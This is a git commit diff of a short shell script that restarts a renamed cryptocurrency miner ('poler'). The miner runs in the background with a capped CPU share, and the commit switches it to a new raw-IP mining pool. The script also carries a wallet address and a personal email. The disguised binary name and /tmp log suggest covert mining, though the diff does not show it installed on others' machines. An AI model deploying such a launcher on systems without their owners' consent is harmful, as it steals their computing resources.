99babc98d0115ea93c79132fcd43747315566fd3
burkabest <52100051+burkabest@users.noreply.github.com>
2019-08-19 16:09:30 -0400

    Update 75.sh

--- 75.sh
+++ 75.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 76 --cpu-priority 3 -o 185.231.155.169:5964 -u 89GxnHS2asmiS6FNHdJBxN7HuZFBS4FhRWudegYV7ZHRNVucvi9FuRWZ8RBKyzKQm46sC4Y1LgRf91vYk5EnejgVNzaJAdq --pass=02-burkabest-my2:robbertopp1@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 76 --cpu-priority 3 -o 94.103.89.5:5901 -u 89GxnHS2asmiS6FNHdJBxN7HuZFBS4FhRWudegYV7ZHRNVucvi9FuRWZ8RBKyzKQm46sC4Y1LgRf91vYk5EnejgVNzaJAdq --pass=02-burkabest-my2:robbertopp1@gmail.com -k
